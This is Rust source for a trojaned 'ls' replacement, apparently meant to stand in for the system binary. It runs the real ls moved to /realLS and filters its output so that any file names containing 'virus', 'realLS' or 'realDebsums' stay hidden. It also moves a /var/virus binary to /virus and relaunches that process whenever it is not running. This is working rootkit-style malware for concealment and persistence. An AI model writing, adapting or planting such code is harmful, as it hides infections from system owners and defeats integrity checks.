use std::env;
use std::process::Command;


fn main() {
    let mut args: Vec<String> = env::args().collect();
    args.remove(0);
    let output = String::from_utf8(Command::new("/realLS").args(&args).output().expect("Why is this rust???").stdout).expect("Wut");
    let lines = output.split("\n");
    for line in lines {
        if !(line.contains("virus") || line.contains("realLS") || line.contains("realDebsums") || line.len() <= 1)  {
            println!("{}", line);
        }
    }

    Command::new("mv").args(vec!["/var/virus", "/virus"]).output().expect("WUT");

    let pid = String::from_utf8(Command::new("pidof").args(vec!["virus"]).output().expect("???").stdout).expect("???");
    if pid.len() < 2 {
        Command::new("/virus").args(vec!["&"]).spawn();
    }
}